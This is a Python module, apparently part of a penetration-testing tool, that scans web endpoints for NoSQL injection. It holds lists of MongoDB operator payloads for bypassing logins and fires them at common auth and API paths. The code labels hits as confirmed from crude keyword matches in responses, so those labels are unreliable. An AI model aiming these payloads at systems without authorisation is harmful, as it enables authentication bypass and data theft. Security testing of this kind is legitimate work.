"""NoSQL injection scanner -- MongoDB, Couchbase, Firebase.

Detects NoSQL injection vulnerabilities by sending common injection payloads
in JSON body parameters, query strings, and URL parameters. Supports MongoDB
operator injection ($ne, $gt, $regex, $where) and JavaScript injection.
"""
from __future__ import annotations
import asyncio
from typing import Any
from talisman.utils.http_client import TalismanHTTPClient
from talisman.utils.logger import get_logger, console, print_finding

log = get_logger(__name__)

NOSQLI_JSON_PAYLOADS = [
    {"username": {"$ne": ""}, "password": {"$ne": ""}},
    {"username": {"$gt": ""}, "password": {"$gt": ""}},
    {"username": {"$regex": ".*"}, "password": {"$regex": ".*"}},
    {"username": "admin", "password": {"$ne": ""}},
    {"username": "admin", "password": {"$regex": ".*"}},
    {"$where": "1==1"},
    {"username": {"$in": ["admin", "root", "test"]}, "password": {"$ne": ""}},
    {"username": "admin", "password": {"$exists": True}},
    {"id": {"$ne": ""}, "role": {"$ne": ""}},
    {"token": {"$ne": ""}},
]

NOSQLI_QUERY_PAYLOADS = [
    "username[$ne]=x&password[$ne]=x",
    "username[$gt]=&password[$gt]=",
    "username[$regex]=.*&password[$regex]=.*",
    "id[$ne]=1&role[$ne]=admin",
    "token[$ne]=invalid",
]

NOSQLI_SUCCESS_INDICATORS = [
    "success", "authenticated", "logged in", "welcome",
    "token", "access_token", "session",
    "true", "granted",
]

ENDPOINTS = [
    "/login", "/api/login", "/auth", "/api/auth",
    "/api/users", "/api/v1/users", "/api/data",
    "/graphql", "/api/graphql",
    "/token", "/api/token",
]


async def _test_json_nosqli(
    url: str,
    payload: dict,
    client: TalismanHTTPClient,
) -> dict[str, Any] | None:
    try:
        r = await client.post(
            url,
            json=payload,
            headers={"Content-Type": "application/json"},
            timeout=10,
        )
        resp_lower = r.text.lower()
        if r.status_code in (200, 201, 301, 302) and any(
            ind in resp_lower for ind in NOSQLI_SUCCESS_INDICATORS
        ):
            return {
                "issue": "nosql_injection_json",
                "endpoint": url,
                "payload": str(payload),
                "status": r.status_code,
                "evidence": r.text[:200],
            }
    except Exception:
        pass
    return None


async def _test_query_nosqli(
    url: str,
    payload: str,
    client: TalismanHTTPClient,
) -> dict[str, Any] | None:
    try:
        separator = "&" if "?" in url else "?"
        r = await client.get(f"{url}{separator}{payload}", timeout=10)
        resp_lower = r.text.lower()
        if r.status_code in (200, 201) and any(
            ind in resp_lower for ind in NOSQLI_SUCCESS_INDICATORS
        ):
            return {
                "issue": "nosql_injection_query",
                "endpoint": url,
                "payload": payload,
                "status": r.status_code,
                "evidence": r.text[:200],
            }
    except Exception:
        pass
    return None


async def run(
    target: str,
    session: Any = None,
    scope: Any = None,
    rate_limiter: Any = None,
    proxy: str | None = None,
    **kwargs: Any,
) -> dict[str, Any]:
    url = target if "://" in target else f"https://{target}"
    console.print(f"\n[module][+] NoSQL Injection Scanner[/module] -> [target]{url}[/target]")
    findings: list[dict[str, Any]] = []

    test_urls = [url.rstrip("/") + ep for ep in ENDPOINTS]
    test_urls.insert(0, url)

    async with TalismanHTTPClient(proxy=proxy, timeout=12) as client:
        for test_url in test_urls:
            json_tasks = [
                _test_json_nosqli(test_url, payload, client)
                for payload in NOSQLI_JSON_PAYLOADS
            ]
            query_tasks = [
                _test_query_nosqli(test_url, payload, client)
                for payload in NOSQLI_QUERY_PAYLOADS
            ]
            results = await asyncio.gather(*(json_tasks + query_tasks), return_exceptions=True)

            for result in results:
                if isinstance(result, dict):
                    method = "JSON body" if result["issue"] == "nosql_injection_json" else "query string"
                    title = f"NoSQL injection via {method} at {result['endpoint']}"
                    print_finding(title, "critical", url)
                    findings.append(result)
                    if session:
                        await session.add_finding(
                            target=url, module="nosqli",
                            vuln_type="nosql_injection",
                            severity="critical", confidence="confirmed",
                            title=title,
                            description=(
                                f"NoSQL injection confirmed at {result['endpoint']} "
                                f"using {method} payload. The server returned a success "
                                f"indicator, suggesting the injection bypassed authentication "
                                f"or data filtering."
                            ),
                            request=f"POST/GET {result['endpoint']}\nPayload: {result['payload']}",
                            evidence=result.get("evidence", ""),
                            reproduction=f"Send {result['payload']} to {result['endpoint']}",
                            remediation=(
                                "1. Sanitize and validate all user input before using in NoSQL queries.\n"
                                "2. Avoid using $where operator with user-controlled data.\n"
                                "3. Use parameterized queries or ORM that escapes operators.\n"
                                "4. Restrict use of $ne, $gt, $regex, $in operators based on context.\n"
                                "5. Apply input validation allowlist for expected data types."
                            ),
                            cvss_score=9.1, cwe="CWE-943",
                        )

    console.print(f"  NoSQL injection scanning complete -- {len(findings)} issues")
    return {"target": url, "findings": findings, "count": len(findings)}
